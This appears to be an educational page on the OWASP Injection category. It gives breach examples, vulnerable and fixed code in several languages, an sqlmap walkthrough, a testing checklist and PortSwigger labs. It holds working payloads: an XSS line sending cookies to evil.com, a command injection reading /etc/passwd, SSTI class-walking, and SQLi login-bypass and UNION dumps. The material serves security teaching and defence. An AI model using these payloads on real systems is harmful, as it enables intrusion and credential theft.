OWASP-A03:2021

Injection

An application is vulnerable when user-supplied data is concatenated or interpreted as part of a command or query sent to an interpreter. The classic example is SQL injection, but the family includes NoSQL, OS command, LDAP, XPath, and template injection.

Difficulty: Easy
SQLi XSS Command Injection NoSQL SSTI

Real-World Incidents

TalkTalk Breach (2015) — 157,000 Customers

A 17-year-old used a classic SQL injection vulnerability in TalkTalk's website to steal the personal data of 157,000 customers, including 15,000 bank account numbers. The attack was a ' OR '1'='1-style injection on a legacy query. TalkTalk was fined £400,000 by the ICO and lost an estimated £77 million in customer churn.

Other Notable Incidents

  • Sony Pictures (2011) — LulzSec used a simple SQL injection to harvest a million user accounts. Embarrassing plaintext passwords leaked.
  • 7-Eleven (2022) — A 9-year-old used an SQLi at a 7-Eleven app to score free slurpees. Demonstrated how easy it can be.
  • Fortnite Vulnerability (2019) — Check Point disclosed an SQL injection in Fortnite's login that could have given attackers access to 200 million players' accounts, payment data, and in-game currency.
  • British Airways (2018) — 380,000 payment cards stolen via XSS injected through a custom Modernizr library. Fined £20 million by the ICO.
  • Tesla Console XSS (2014) — A stored XSS in Tesla's Model S admin console could have allowed remote control of the car.
  • SamSam Ransomware (2018) — Attacked Atlanta, the City of Newark, and hospitals via command injection on JBoss servers, causing $30M+ in damages to Atlanta alone.

How It Works — The Injection Family

1. SQL Injection (SQLi)

User input is concatenated into a SQL query. The attacker closes the original query with a quote, appends their own SQL, and comments out the rest.

2. Cross-Site Scripting (XSS)

User input is rendered in HTML without escaping. The attacker injects a <script> tag that runs in other users' browsers. Comes in three flavors: reflected (in a single request), stored (persisted in the database, executed for every visitor), and DOM-based (in client-side JavaScript).

3. OS Command Injection

User input is passed to a shell command (e.g., ping, convert, ImageMagick's convert). The attacker uses ;, |, or backticks to chain arbitrary commands.

4. NoSQL Injection

MongoDB queries built from JSON. Attacker passes an object like {"$gt": ""} as the password, bypassing the check.

5. Server-Side Template Injection (SSTI)

The application uses a template engine (Jinja2, Twig, Freemarker) and embeds user input into the template before rendering. The attacker injects template directives to execute code.

6. LDAP Injection & XPath Injection

Similar pattern with LDAP filters or XPath queries. Used to bypass authentication or dump directory data.

Vulnerable Code — The Classics

Example 1: SQL Injection (Node.js with raw query)

JavaScriptVulnerable
// ❌ Concatenating user input directly into SQL
app.post('/login', (req, res) => {
    const query = `SELECT * FROM users
                   WHERE email = '${req.body.email}'
                   AND password = '${req.body.password}'`;
    db.query(query, (err, rows) => {
        if (rows.length) res.send('Logged in!');
        else res.send('Invalid');
    });
});

// Payload: email = "admin@x.com' --"
// Resulting query: SELECT * FROM users WHERE email = 'admin@x.com' --' AND password = '...'
// → Password check commented out, login bypassed

Example 2: Reflected XSS (PHP)

PHPVulnerable
// ❌ Reflecting user input directly into HTML
// search.php?q=
$q = $_GET['q'];
echo "You searched for: $q";

// Payload: /search.php?q=<script>fetch('//evil.com?c='+document.cookie)</script>
// → Every visitor who clicks the malicious link sends their session cookie to the attacker

Example 3: Stored XSS in Comments (Python)

Python (Jinja2)Vulnerable
# ❌ Using |safe disables auto-escaping in Jinja2
@app.route('/comment', methods=['POST'])
def post_comment():
    text = request.form['comment']
    db.comments.insert({"text": text})
    return redirect(url_for('view_comments'))

# In the template
# {{ comment.text | safe }}   <-- DANGEROUS

# Payload: <img src=x onerror="alert(document.cookie)">
# → Runs on every page that displays comments

Example 4: OS Command Injection (Node.js)

JavaScriptVulnerable
// ❌ Building a shell command with user input
app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 1 ${host}`, (err, stdout) => {
        res.send(stdout);
    });
});

// Payload: ?host=;cat /etc/passwd
// Resulting command: ping -c 1 ;cat /etc/passwd
// → Sends the contents of /etc/passwd to the response

Example 5: NoSQL Injection (MongoDB)

JavaScript (Express + MongoDB)Vulnerable
// ❌ Building a query from JSON the user controls
app.post('/login', (req, res) => {
    const user = db.collection('users').findOne({
        email: req.body.email,
        password: req.body.password
    });
    // The attacker sends: { "email": "admin@x.com", "password": { "$ne": "" } }
    // MongoDB evaluates $ne as "not equal to empty string" → matches any password
});

Example 6: Server-Side Template Injection (Python/Jinja2)

PythonVulnerable
from jinja2 import Template

# ❌ Rendering user input as a template string
@app.route('/preview')
def preview():
    template = Template(request.args.get('tpl'))
    return template.render()

# Payload: ?tpl={{config.items()}}
# → Leaks Flask configuration, including the SECRET_KEY
# Payload: ?tpl={{ ''.__class__.__mro__[1].__subclasses__() }}
# → Lists every class loaded, often including one that can spawn a shell

Real Attack Walkthrough — Classic SQLi on a Login Form

1
Find a parameter

The login form has two fields: email and password. Enter ' (a single quote) in the email field. You get a server error: You have an error in your SQL syntax near '' — clear evidence of SQLi.

2
Confirm the injection

Try admin@x.com' OR '1'='1 in email and anything in password. If you log in, the site is vulnerable.

3
Enumerate the database

Use sqlmap to automate the exploitation. sqlmap -u "https://target.com/login" --data="email=foo&password=bar" --dbs will fingerprint the DB and list databases.

4
Dump tables

Once you have the schema, dump the users table: sqlmap ... -D appdb -T users --dump. You'll get every email + (hopefully hashed) password.

5
Escalate

Crack the admin's password hash, log in to the admin panel, look for file upload, command execution, or pivoting to other systems.

The Classic Union-Based SQLi Payload

SQLPayload
' UNION SELECT id, email, password, 0 FROM users --

-- Final query becomes:
SELECT id, name, price FROM products
WHERE category = ''
UNION SELECT id, email, password, 0 FROM users --'

-- Output: every user's email and password is rendered on the page

Secure Code — The Fixes

1. Parameterized Queries (SQLi)

JavaScript (Node + pg)Secure
// ✅ Placeholder values are bound, never concatenated
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    const { rows } = await db.query(
        'SELECT * FROM users WHERE email = $1',
        [email]
    );
    if (rows.length && await bcrypt.compare(password, rows[0].password)) {
        res.send('Logged in!');
    } else {
        res.send('Invalid');
    }
});

2. Output Encoding (XSS)

JavaScript (React)Secure
// ✅ React escapes by default — never use dangerouslySetInnerHTML for user content
function Comment({ text }) {
    return <div>{text}</div>;  // Safe — <script> is rendered as text
}

// If you absolutely need to render HTML (e.g., a rich-text editor), sanitize first
import DOMPurify from 'dompurify';
function SafeHTML({ html }) {
    return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}

3. Content Security Policy (XSS Defense-in-Depth)

HTTP HeaderSecure
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{random-per-request}';
    style-src 'self' 'nonce-{random-per-request}';
    img-src 'self' data: https:;
    object-src 'none';
    base-uri 'none';
    frame-ancestors 'none';
    form-action 'self';
    upgrade-insecure-requests;

4. Avoid the Shell Entirely (Command Injection)

Node.jsSecure
// ✅ Use execFile with arguments as an array — no shell interpolation
const { execFile } = require('child_process');
app.get('/ping', (req, res) => {
    const host = req.query.host;
    if (!/^[a-zA-Z0-9.-]+$/.test(host)) return res.status(400).send('Invalid host');
    execFile('/bin/ping', ['-c', '1', host], (err, stdout) => {
        res.send(stdout);
    });
});

5. Schema Validation for NoSQL

JavaScriptSecure
// ✅ Force types so $ne cannot be passed
app.post('/login', (req, res) => {
    const email = String(req.body.email);
    const password = String(req.body.password);  // Forces string, can't be an object
    const user = await db.collection('users').findOne({ email, password });
    // ...
});

6. Never Compile User Input as a Template (SSTI)

PythonSecure
# ✅ Pass user input as a template variable, not as part of the template
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader('templates'))

@app.route('/preview')
def preview():
    template = env.get_template('preview.html')  # Fixed template
    return template.render(title=request.args.get('title'))  # User data as variable

How to Test for It

  1. Map every input — URL params, form fields, JSON body, headers, cookies, file uploads, WebSocket frames.
  2. Send a quote — ', ", ${7*7}, {{7*7}} in every input. If anything breaks or returns a different response, investigate.
  3. Use sqlmap for SQLi — the gold standard. Run it against any interesting endpoint (with permission).
  4. Use Burp Scanner / ZAP — they find reflected XSS, command injection, and many more automatically.
  5. Check stored XSS — submit a unique string like xss-test-{uuid} in comments, profiles, support tickets. Then view the page as another user and see if your script runs.
  6. For SSTI — try {{7*7}}, ${7*7}, <%= 7*7 %> in any input that gets reflected or stored.
  7. For command injection — try ; ls, | whoami, $(id) in fields that might be passed to a system command.

Prevention Checklist

✅ Defense in Depth
  • Use parameterized queries / prepared statements for ALL database access. No exceptions.
  • Use ORMs — but understand what they do. Badly written ORMs can be just as injectable as raw SQL.
  • Encode all output by default. Disable auto-escaping only with extreme care.
  • Set a strict Content-Security-Policy with nonces for inline scripts.
  • Never pass user input to a shell. Use language-native APIs or strict allowlists.
  • Validate input type and format server-side, even when the front-end does so.
  • Use a WAF (Web Application Firewall) as a temporary measure while you fix the root cause.
  • For XSS: prefer React/Vue/Angular auto-escaping. Sanitize any rich HTML with DOMPurify.

Practice with PortSwigger Labs

Injection is PortSwigger's biggest category. Start with the SQLi and XSS tracks, then branch out to Command Injection, NoSQL, and SSTI.

SQL Injection

  • SQL injection: WHERE clause allowing retrieval of hidden data Apprentice The classic ' OR 1=1 -- walkthrough.
  • SQL injection allowing login bypass Apprentice Log in as the administrator without knowing the password.
  • UNION attack: determining the number of columns Apprentice Use ORDER BY and UNION SELECT NULL to find the column count.
  • UNION attack: retrieving data from other tables Apprentice Dump the users table and crack the admin password.
  • UNION attack: retrieving multiple values in a single column Practitioner Concatenate two columns in one output field.
  • Querying the DB type and version (MySQL / MSSQL) Practitioner Fingerprint the database, then pivot.
  • Listing database contents (non-Oracle) Practitioner Enumerate tables via information_schema.
  • Blind SQL injection with conditional responses Practitioner Extract the admin password one character at a time.
  • Blind SQL injection with time delays Practitioner Use WAITFOR DELAY / SLEEP to confirm injection.
  • Blind SQLi with out-of-band data exfiltration Expert Use DNS lookups to exfiltrate data via Burp Collaborator.
  • SQLi with filter bypass via XML encoding Expert Bypass a WAF that strips SQL keywords using XML encoding.

Cross-Site Scripting (XSS)

  • Reflected XSS into HTML context with nothing encoded Apprentice The classic <script>alert(1)</script> in a search field.
  • Stored XSS into HTML context with nothing encoded Apprentice Stored XSS in a comment that fires for every visitor.
  • DOM XSS in document.write sink Apprentice Find the document.location source / document.write sink chain.
  • Reflected XSS into a JavaScript string Practitioner Angle brackets are encoded — break out of the JS string instead.
  • Stored XSS in anchor href attribute Practitioner Use javascript: in an href.
  • Reflected XSS with AngularJS sandbox escape Practitioner Break out of the AngularJS template sandbox.
  • Reflected XSS protected by CSP, with CSP bypass Practitioner Find a JSONP endpoint whitelisted by the CSP.
  • Reflected XSS protected by a very strict CSP Expert Use a CSP script nonce that's exposed via a separate request.
  • Reflected XSS in a JavaScript URL with some characters blocked Expert Use Unicode escapes to bypass character filtering.

OS Command Injection

  • OS command injection, simple case Apprentice Run whoami via the stock-check feature.
  • Blind OS command injection with time delays Practitioner No output — use timing to confirm and then out-of-band exfil.
  • Blind OS command injection with OOB data exfiltration Expert Exfiltrate /etc/passwd via DNS to a Collaborator domain.

NoSQL & Template Injection

  • Exploiting NoSQL operator injection to bypass authentication Apprentice Log in as admin using {"$ne": ""} as the password.
  • Exploiting NoSQL injection to extract data Practitioner Use $where to dump unknown fields.
  • SSTI: basic Practitioner Detect and exploit a template injection in ERB.
  • SSTI with a custom exploit Expert Chain gadgets in a custom template engine to get RCE.
